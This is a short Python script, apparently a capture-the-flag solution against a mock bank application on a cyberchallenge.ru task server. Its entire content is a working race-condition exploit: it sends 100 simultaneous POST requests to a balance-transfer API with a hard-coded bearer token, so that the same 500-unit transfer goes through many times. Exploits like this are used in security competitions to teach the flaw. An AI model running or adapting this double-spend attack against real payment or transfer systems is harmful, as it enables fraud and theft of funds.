import requests
import asyncio as a
from aiohttp import ClientSession

async def func():
    async with ClientSession(
        headers={
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MjEyNCwiaWF0IjoxNjAwMTg3MTE3LCJleHAiOjE2MDA3OTE5MTd9.c2ZFEyyt48iRkmHgyW4WodbnZ5S7hxLyeUiuMCspzhg'}
    ) as session:
        async with session.post(
            'http://rave-bank.level-up.2020.tasks.cyberchallenge.ru/api/balances/transfer',
                json={
                    "balanceId": 2091,
                    "targetId": 2123,
                    "amount": 500}) as response:
            response = await response.read()
            print(response)
                
tasks = []
loop = a.get_event_loop()
for i in range(100):
    task = a.ensure_future(func())
    tasks.append(task)
loop.run_until_complete(a.wait(tasks))